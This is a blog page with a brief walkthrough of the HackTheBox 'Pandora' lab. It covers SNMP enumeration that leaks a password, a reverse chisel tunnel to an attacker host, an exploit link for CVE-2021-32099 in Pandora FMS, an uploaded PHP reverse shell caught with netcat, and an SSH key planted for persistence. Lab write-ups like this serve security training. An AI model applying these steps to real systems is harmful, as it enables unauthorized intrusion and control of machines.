<!doctype html><html lang=en class=dark><head><title>0xHippo's Blog | Pandora</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,minimum-scale=1"><link rel=apple-touch-icon sizes=180x180 href=/favicon/apple-touch-icon.png><link rel=icon type=image/png href=/img/hippoSkullTransparent32x32.png><link rel=manifest href=/favicon/site.webmanifest><link rel=mask-icon href=/favicon/safari-pinned-tab.svg color=#5bbad5><link rel="shortcut icon" href=/favicon/favicon.ico><meta name=theme-color content="#ffffff"><meta property="og:title" content="0xHippo's Blog | Pandora"><link rel=stylesheet href="/css/style.min.deca99b26121618596372e57d926ddc7a2595b4b08bce324e050ca20cfdc9522.css"><link href=/css/blonde.min.css rel=stylesheet type=text/css media=print onload='this.media=" all"'><meta name=description content="do an nmap udp scan to see snmp port open
used snmp_enum from metasploit to view running processes and found the command below:
/bin/sh -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'  creds: daniel::HotelBabylon23
ssh to machine with creds
tunnel connection to user daniel so that we can access pandora_console (which is only available via localhost from the server)
bring chisel binary to working directory in linux"><meta property="og:site_name" content="0xHippo's Blog"><meta property="og:description" content="do an nmap udp scan to see snmp port open
used snmp_enum from metasploit to view running processes and found the command below:
/bin/sh -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'  creds: daniel::HotelBabylon23
ssh to machine with creds
tunnel connection to user daniel so that we can access pandora_console (which is only available via localhost from the server)
bring chisel binary to working directory in linux"><meta property="og:url" content="https://0xHippo.github.io/posts/first/"><meta property="og:type" content="website"><meta property="og:locale" content="en_US"><meta name=twitter:card content="summary_large_image"><meta name=twitter:site content><link rel=canonical href=https://0xHippo.github.io/posts/first/><meta name=twitter:description content="do an nmap udp scan to see snmp port open
used snmp_enum from metasploit to view running processes and found the command below:
/bin/sh -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'  creds: daniel::HotelBabylon23
ssh to machine with creds
tunnel connection to user daniel so that we can access pandora_console (which is only available via localhost from the server)
bring chisel binary to working directory in linux"><meta property="article:published_time" content="2022-02-21T20:20:22-04:00"><meta property="article:updated_time" content="2022-02-21T20:20:22-04:00"><meta property="og:image" content="https://0xHippo.github.io/pandora/pandora.png"><meta property="og:image:url" content="https://0xHippo.github.io/pandora/pandora.png"><link rel=stylesheet href=/css/custom.css><i class="dark hidden"></i>
<script src=https://kit.fontawesome.com/a076d05399.js crossorigin=anonymous></script></head><body class=font-sans><div class="min-h-screen flex flex-col bg-gray-100 dark:bg-warmgray-800"><div class=bg-red-900><div class="container max-w-screen-xl mr-auto ml-auto"><nav class="flex items-center justify-between flex-wrap bg-red-900 p-6"><div class="flex items-center flex-no-shrink bg-red-900 text-white mr-6"><a href=https://0xHippo.github.io/><span class="font-semibold text-2xl tracking-tight">0xHippo's Blog</span></a></div><div class="flex md:hidden"><div class=py-2><button onclick=toggleDarkMode() class="focus:outline-none mr-1" aria-label="Darkmode Toggle Button"><i id=icon class="icon-moon inline-flex align-middle leading-normal text-lg text-white"></i></button>
<span class=text-white>|</span></div><button id=hamburgerbtn class="flex items-center px-3 py-1 text-white hover:opacity-50" aria-label="Hamburger Button">
<span class="icon-menu text-2xl"></span></button></div><div class="hidden w-full md:flex md:flex-row sm:items-center md:w-auto" id=mobileMenu><div class="text-sm lg:flex-grow"></div><div class=navmenu><a href=/ class="no-underline duration-200 block mt-4 sm:inline-block sm:mt-0 text-white hover:opacity-50 mr-4">Home</a>
<a href=/about/ class="no-underline duration-200 block mt-4 sm:inline-block sm:mt-0 text-white hover:opacity-50 mr-4">About</a>
<a href=/contact/ class="no-underline duration-200 block mt-4 sm:inline-block sm:mt-0 text-white hover:opacity-50 mr-4">Contact</a></div><form class=widget-search__form role=search method=get action=https://duckduckgo.com><label><input class="w-full p-3 focus:outline-none dark:bg-warmgray-900 dark:text-white placeholder-gray-700 dark:placeholder-gray-300" type=search placeholder=Search... name=q aria-label=Search></label>
<input class=hidden type=submit value=Search>
<input type=hidden name=sitesearch value=https://0xHippo.github.io/></form><div class="text-white invisible md:visible"><button onclick=toggleDarkMode() class=focus-visible:outline-none aria-label="Darkmode Toggle Button"><i id=icon2 class="icon-moon hover:opacity-50 duration-200 inline-flex align-middle leading-normal text-lg ml-2"></i></button></div></div></nav></div></div><style>.active{display:block}</style><script>let hamburger=document.getElementById("hamburgerbtn"),mobileMenu=document.getElementById("mobileMenu");hamburger.addEventListener("click",function(){mobileMenu.classList.toggle("active")})</script><div class="container max-w-screen-xl mx-auto mt-4 flex-grow px-5 lg:px-0" id=content><div class=lg:mx-5><div class="grid grid-cols-3 gap-4"><div class="hidden lg:block lg:col-span-1"><style>img{float:left}</style><div class=mb-3><img src=/img/hippoSkullTransparent1000x1000.png alt=0xHippo width=150><ul class="text-xl text-left text-gray-700 py-3 px-3 dark:text-gray-300"><li class=font-bold>0xHippo</li><li><a href=https://twitter.com/_0xHippo rel="noopener noreferrer" target=_blank><i class="fab fa-fw fa-twitter-square" aria-hidden=false></i>
<span class=label>Twitter</span></a></li><li><a href=https://github.com/0xHippo rel="noopener noreferrer" target=_blank><i class="fab fa-fw fa-github-square" aria-hidden=false></i>
<span class=label>Github</span></a></li></ul></div><div class="bg-white panel mb-3 pb-5 dark:bg-warmgray-900"><p class="text-xl text-gray-700 py-3 px-3 dark:text-gray-300 font-bold">Archives</p></div><div class="bg-white panel mb-3 dark:bg-warmgray-900"><p class="text-xl text-center text-gray-700 py-3 pl-3 dark:text-gray-300 font-bold">Tags</p><div class="panel-block p-2"><a href=/tags/hackthebox><span class="duration-100 inline-flex py-2 leading-4 mr-2 mb-2 content-center bg-gray-100 justify-center h-8 px-3 text-blue-500 hover:text-blue-900 dark:bg-warmgray-800">hackthebox</span></a>
<a href=/tags/linux><span class="duration-100 inline-flex py-2 leading-4 mr-2 mb-2 content-center bg-gray-100 justify-center h-8 px-3 text-blue-500 hover:text-blue-900 dark:bg-warmgray-800">linux</span></a></div></div><div class="bg-white panel mb-3 pb-5 dark:bg-warmgray-900"><p class="text-xl text-center text-gray-700 py-5 dark:text-gray-300 font-bold">Recent Posts</p><div class=mx-6><a href=/posts/first/><div class="w-full block mt-3 bg-white hover:bg-gray-100 duration-200 dark:bg-warmgray-900 dark:text-gray-200 dark:hover:bg-warmgray-800"><div class=px-2><div class="text-gray-900 font-bold text-xl dark:text-white">Pandora</div><p class="text-sm text-gray-600 flex items-center pb-1 dark:text-gray-400"><time><span class="icon-access_time mr-1"></span>2022/02/21</time></p></div></div></a><a href=/posts/blunder/><div class="w-full block mt-3 bg-white hover:bg-gray-100 duration-200 dark:bg-warmgray-900 dark:text-gray-200 dark:hover:bg-warmgray-800"><div class=px-2><div class="text-gray-900 font-bold text-xl dark:text-white">Blunder</div><p class="text-sm text-gray-600 flex items-center pb-1 dark:text-gray-400"><time><span class="icon-access_time mr-1"></span>2020/08/25</time></p></div></div></a></div></div></div><div class="bg-white col-span-3 lg:col-span-2 p-5 dark:bg-warmgray-900 dark:text-white"><h1 class="title text-4xl font-bold mb-2">Pandora</h1><div class="content prose md:prose-lg lg:prose-xl max-w-none dark:prose-invert py-1"><p>do an nmap udp scan to see snmp port open</p><p>used snmp_enum from metasploit to view running processes and found the command below:</p><pre><code>/bin/sh             -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'
</code></pre><p>creds: daniel::HotelBabylon23</p><p>ssh to machine with creds</p><p>tunnel connection to user daniel so that we can access pandora_console (which is only available via localhost from the server)</p><p>bring chisel binary to working directory in linux</p><p>Create python http server and wget from the victim server</p><p>attacker machine: chisel server -p 8000 &ndash;reverse</p><p>victim machine: ./chisel client 10.10.14.175:8000 R:9999:127.0.0.1:80</p><p>info on chisel: <a href=https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html>https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html</a>
pandora console is hosted on port 80 on the machine. Our tunnel is running through port 8000, and now we can access
localhost:9999/pandora_console</p><p>google for pandora fms exploits, we find on for pandora_console.
link: <a href=https://github.com/zjicmDarkWing/CVE-2021-32099>https://github.com/zjicmDarkWing/CVE-2021-32099</a></p><p>This person tuned the command to specifically work for HTB in this scenario.</p><p>We go to the provided link, with changed port, and we are now authed as admin</p><p>browse back to /pandora_console and we have admin access.</p><p>Find the file manager within admin tools, upload a php reverse shell named xxxx.php</p><p>files uploaded here are stored in pandora_console/images/
This was found using the command &ldquo;find /var/www/pandora/ -name xxxx.php&rdquo;</p><p>setup netcat listener for whatever port the rev shell goes to</p><p>navigate to localhost:9999/pandora_console/images/xxxx.php in browser</p><p>we are now Matt</p><p>Upgrade shell by creating ssh key for Matt, ensure authorized_keys file exists, and use keys to ssh in</p></div></div></div></div></div><footer class="bg-red-900 text-white p-6"><div class="container max-w-screen-xl mr-auto ml-auto"><p>&copy; 2022 <a href=https://0xHippo.github.io/ class="duration-200 hover:opacity-50">0xHippo's Blog</a></p><p>Powered by <a href=https://gohugo.io/ class="duration-200 hover:opacity-50">Hugo</a>, Theme <a href=https://github.com/opera7133/Blonde class="duration-200 hover:opacity-50">Blonde</a>.</p></div><script>var icon=document.getElementById("icon"),icon2=document.getElementById("icon2");document.documentElement.classList.contains("dark")||localStorage.theme==="dark"||!("theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches?(icon.classList.remove("icon-moon"),icon.classList.add("icon-sun"),icon2.classList.remove("icon-moon"),icon2.classList.add("icon-sun"),document.documentElement.classList.add("dark")):document.documentElement.classList.remove("dark");function toggleDarkMode(){document.documentElement.classList.contains("dark")?(icon.classList.remove("icon-sun"),icon.classList.add("icon-moon"),icon2.classList.remove("icon-sun"),icon2.classList.add("icon-moon"),document.documentElement.classList.remove("dark"),localStorage.theme="light"):(icon.classList.remove("icon-moon"),icon.classList.add("icon-sun"),icon2.classList.remove("icon-moon"),icon2.classList.add("icon-sun"),document.documentElement.classList.add("dark"),localStorage.theme="dark")}</script></footer></div></body></html>